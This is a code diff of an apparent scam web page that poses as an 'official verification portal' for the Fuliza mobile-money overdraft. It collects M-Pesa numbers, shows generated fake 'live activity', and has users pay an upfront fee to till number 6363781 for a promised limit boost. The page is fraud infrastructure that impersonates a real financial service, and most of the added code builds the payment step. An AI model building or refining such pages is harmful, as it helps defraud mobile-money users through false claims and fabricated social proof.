@@ -29,7 +29,7 @@ body {
   text-align:center;
 }
 
-/* FIRST SCREEN UPGRADE */
+/* FIRST SCREEN */
 .top-icon {
   width:70px;
   height:70px;
@@ -326,19 +326,10 @@ function render(){
   if(step===1){
     app.innerHTML = `
     <div class="card">
-
       <div class="top-icon">👤</div>
-
-      <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">
-        Fuliza Plus+
-      </h2>
-
+      <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">Fuliza Plus+</h2>
       <div class="sub-title">OFFICIAL VERIFICATION PORTAL</div>
-
-      <p class="desc">
-        Verify your identity to unlock higher daily transaction limits.
-      </p>
-
+      <p class="desc">Verify your identity to unlock higher daily transaction limits.</p>
       <input class="input" placeholder="Enter M-Pesa Number">
       <button class="green" onclick="next()">Check My Eligibility</button>
     </div>`;
@@ -374,7 +365,64 @@ function render(){
   if(step===7){
     app.innerHTML = `
     <div class="card">
-
       <div class="live-activity">
         <div class="live-icon">↻</div>
-        <div
+        <div>
+          <div class="live-label">LIVE ACTIVITY</div>
+          <div class="live-text" id="liveActivityText">
+            ${generateActivity()}
+          </div>
+        </div>
+      </div>
+
+      <h3>Select Your Limit</h3>
+      <div class="grid">
+        ${limits.map(l=>`
+          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
+            <strong>Ksh ${l.amount}</strong>
+            <div class="fee">Fee: Ksh ${l.fee}</div>
+          </div>
+        `).join("")}
+      </div>
+      <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
+    </div>`;
+  }
+}
+
+function next(){
+  step++;
+  render();
+}
+
+function select(a){
+  selectedAmount = a;
+  render();
+}
+
+function openModal(){
+  let fee = getFee(selectedAmount);
+
+  document.getElementById("modal").style.display="flex";
+
+  document.getElementById("modalTitle").innerText =
+  "Limit will be boosted to Ksh " + selectedAmount;
+
+  document.getElementById("modalFee").innerHTML =
+  `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
+  <b>6363781</b> is confirmed, your boost request will begin processing.`;
+
+  document.getElementById("payBtn").innerText =
+  "Pay Ksh " + fee;
+}
+
+function closeModal(){
+  document.getElementById("modal").style.display="none";
+}
+
+document.addEventListener("DOMContentLoaded", function () {
+  render();
+});
+</script>
+
+</body>
+</html>
